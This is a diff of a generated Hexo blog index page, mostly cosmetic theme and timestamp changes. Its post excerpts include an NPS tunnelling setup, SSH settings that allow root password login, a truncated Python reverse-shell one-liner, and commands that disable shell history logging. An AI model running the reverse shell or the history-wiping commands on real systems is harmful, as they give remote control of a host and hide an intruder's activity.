@@ -20,7 +20,7 @@
   <meta content="ChuTian" name="apple-mobile-web-app-title">
   <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
   <meta content="telephone=no" name="format-detection">
-  <link rel="preload" href="/css/style.css?time=1640166289614" as="style">
+  <link rel="preload" href="/css/style.css?time=1640176318221" as="style">
   <link rel="preload" href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 <link rel="preload" href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
@@ -65,7 +65,7 @@ article + article,
   --color-text: #444;
   --color-block: #f6f6f6;
   --color-inlinecode: #228b22;
-  --color-codeblock: #f5fffa;
+  --color-codeblock: #fff7ea;
   --color-h1: #3a3a3a;
   --color-h2: #3a3a3a;
   --color-h3: #333;
@@ -131,7 +131,7 @@ body.modal-active {
   }
 }
 a {
-  color: #1b79c4;
+  color: #2196f3;
   cursor: pointer;
   text-decoration: none;
   transition: all 0.28s ease;
@@ -1622,8 +1622,8 @@ ul.list-v >li>a:hover {
 }
 
   </style>
-  <link rel="stylesheet" href="/css/style.css?time=1640166289614" media="print" onload="this.media='all';this.onload=null">
-  <noscript><link rel="stylesheet" href="/css/style.css?time=1640166289614"></noscript>
+  <link rel="stylesheet" href="/css/style.css?time=1640176318221" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css?time=1640176318221"></noscript>
   
 <script>
 if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
@@ -2257,7 +2257,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class='md article-desc' itemprop="articleBody">
     
       
-        NPS项目地址：https://github.com/ehang-io/nps服务端操作123456789101112# 下载服务器端包wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz# 解压tar -zxvf linux_amd64_server.tar.gz#...
+        NPS项目地址：https://github.com/ehang-io/nps服务端操作# 下载服务器端包
+wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
+
+# 解压
+tar -zxvf linux_amd64_server.tar.gz
+
+# 安装
+./nps...
       
     
   </div>
@@ -2308,17 +2315,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class='md article-desc' itemprop="articleBody">
     
       
-        压缩：1tar -zcvf &lt;自定义文件名&gt;  &lt;需要压缩的目录或文件路径&gt; 
+        压缩：tar -zcvf &lt;自定义文件名&gt;  &lt;需要压缩的目录或文件路径&gt; 
 
-
-解压：1tar -zxvf test.tar.gz
-
-
-
+解压：tar -zxvf test.tar.gz
 
 分卷压缩将文件data.tar.gz 分为 5000m 一个包
-1tar -zcvf - data.tar.gz  | split -d -b 5000m - d.tar.gz
-
+tar -zcvf - data.tar.gz  | split -d -b 5000m - d.tar.gz
 
 
 
@@ -2372,7 +2374,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class='md article-desc' itemprop="articleBody">
     
       
-        Python版1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s....
+        Python版python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fi...
       
     
   </div>
@@ -2424,10 +2426,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
       
         使输入的命令不被记录：unset HISTFILE
-1unset HISTFILE 
-or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+unset HISTFILE 
 
-这样的话，在Linux上输入的命令将不会记录在 ...
+orunset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+
+这样的话，在Linux上输入的命令将不会记录在 ....
       
     
   </div>
@@ -2529,11 +2532,19 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
       
         
 修改配置文件
-12vi /etc/ssh/sshd_config
+vi /etc/ssh/sshd_config
+
+
 修改以下2行为yes
-123PermitRootLogin yesPasswordAuthentication yes
+PermitRootLogin yes
+
+PasswordAuthentication yes
+
+
 修改完成后重启ssh
-1sudo /etc/init.d/ssh restart
+sudo /etc/init.d/ssh restart
+
+
 
 
 
@@ -2778,39 +2789,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
       
     
       
-        <br>
-        <div class="social-wrapper" itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>footer.license</p>
-</div>
-      
-    
-      
-        
-          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
-</div>
-        
-      
-    
-      
-        footer.use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/dev" target="_blank" class="codename">Volantis</a>
-        footer.theme
-      
-    
-      
         <div class='copyright'>
-        <p><a href="/">Copyright © 2017-2020 ChuTian</a></p>
+        <p><a href="/">Copyright © 2017-2021 ChuTian</a></p>
 
         </div>
       
@@ -2855,8 +2835,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
   <script>
   volantis.message = (title, message, option = {}, done = null) => {
     if (typeof iziToast === "undefined") {
-      volantis.css('/css/message.css?time=1640166289614')
-      volantis.js('/js/thirdparty/message.js?time=1640166289614', () => {
+      volantis.css('/css/message.css?time=1640176318221')
+      volantis.js('/js/thirdparty/message.js?time=1640176318221', () => {
         tozashMessage(title, message, option, done);
       });
     } else {
@@ -2901,8 +2881,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
 
   volantis.question = (title, message, option = {}, success = null, cancel = null, done = null) => {
     if (typeof iziToast === "undefined") {
-      volantis.css('/css/message.css?time=1640166289614')
-      volantis.js('/js/thirdparty/message.js?time=1640166289614', () => {
+      volantis.css('/css/message.css?time=1640176318221')
+      volantis.js('/js/thirdparty/message.js?time=1640176318221', () => {
         tozashQuestion(title, message, option, success, cancel, done);
       });
     } else {
@@ -2961,8 +2941,8 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
     }
     
     if (typeof iziToast === "undefined") {
-      volantis.css('/css/message.css?time=1640166289614')
-      volantis.js('/js/thirdparty/message.js?time=1640166289614', () => {
+      volantis.css('/css/message.css?time=1640176318221')
+      volantis.js('/js/thirdparty/message.js?time=1640176318221', () => {
         hideMessage(done);
       });
     } else {
@@ -3125,7 +3105,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
     
       volantis.APlayerController = {};
     
-    volantis.js('/js/plugins/rightMenu.js?time=1640166289614')
+    volantis.js('/js/plugins/rightMenu.js?time=1640176318221')
   </script>
 
 
@@ -3139,19 +3119,19 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
     
       const sites_api = document.getElementById('sites-api');
       if (sites_api != undefined && typeof SitesJS === 'undefined') {
-        volantis.js("/js/plugins/sites.js?time=1640166289614")
+        volantis.js("/js/plugins/sites.js?time=1640176318221")
       }
     
     
       const friends_api = document.getElementById('friends-api');
       if (friends_api != undefined && typeof FriendsJS === 'undefined') {
-        volantis.js("/js/plugins/friends.js?time=1640166289614")
+        volantis.js("/js/plugins/friends.js?time=1640176318221")
       }
     
     
       const contributors_api = document.getElementById('contributors-api');
       if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
-        volantis.js("/js/plugins/contributors.js?time=1640166289614")
+        volantis.js("/js/plugins/contributors.js?time=1640176318221")
       }
     
   };
@@ -3264,7 +3244,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
       VolantisFancyBox.bind('#valine_container .vcontent img:not(.vemoji)');
     }
   }
-  volantis.js('/js/thirdparty/valine.js?time=1640166289614').then(pjax_valine)
+  volantis.js('/js/thirdparty/valine.js?time=1640176318221').then(pjax_valine)
   volantis.pjax.push(pjax_valine);
 </script>
 
@@ -3273,7 +3253,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
 
 
 
-<script src="/js/app.js?time=1640166289614.js"></script>
+<script src="/js/app.js?time=1640176318221.js"></script>
 
 
 <!-- optional -->
@@ -3286,7 +3266,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
 
   function loadSearchScript() {
     // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
-    return volantis.js("/js/search/hexo.js?time=1640166289614");
+    return volantis.js("/js/search/hexo.js?time=1640176318221");
   }
 
   function loadSearchService() {
@@ -3327,6 +3307,17 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
 
   <script>
 
+  volantis.css("https://cdn.jsdelivr.net/npm/highlight.js@11.3.1/styles/base16/darktooth.css");
+
+
+  volantis.js("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js").then(()=>{
+    volantis.requestAnimationFrame(hljs.highlightAll)
+  })
+  volantis.pjax.push(()=>{
+    document.querySelectorAll('pre code').forEach((block) => {
+      hljs.highlightElement(block);
+    });
+  },"highlightjs")
 
 
   function pjax_highlightjs_copyCode(){
@@ -3392,7 +3383,7 @@ or1unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/de
   var runningOnBrowser = typeof window !== "undefined";
   var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
   if (!isBot) {
-    volantis.js('/js/plugins/parallax.js?time=1640166289614').then(()=>{
+    volantis.js('/js/plugins/parallax.js?time=1640176318221').then(()=>{
       parallax()
     })
     volantis.pjax.send(()=>{
